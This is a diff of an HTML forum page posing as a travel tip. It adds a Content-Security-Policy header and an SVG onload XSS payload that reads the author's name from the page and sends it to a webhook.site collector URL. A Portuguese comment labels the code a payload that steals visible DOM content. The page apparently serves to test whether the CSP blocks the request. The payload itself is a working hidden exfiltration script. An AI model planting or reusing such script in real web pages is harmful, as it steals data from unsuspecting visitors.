@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Forum Post – Travel Tips</title>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">
   <style>
     body {
       font-family: sans-serif;
@@ -24,11 +25,14 @@
 <body>
   <h1>Travel Forum</h1>
   <div class="post">
-    <div class="author">User123:</div>
+    <div class="author" id="user">User123:</div>
     <div class="content">
       Here's a cool travel tip!<br><br>
 
-      <svg onload="fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a')">
+      <!-- Payload que rouba conteúdo DOM visível -->
+      <svg onload="
+        fetch('https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?stolen=' + encodeURIComponent(document.getElementById('user').innerText))
+      ">
         <!-- harmless looking SVG -->
       </svg>
 
@@ -37,3 +41,4 @@
   </div>
 </body>
 </html>
+
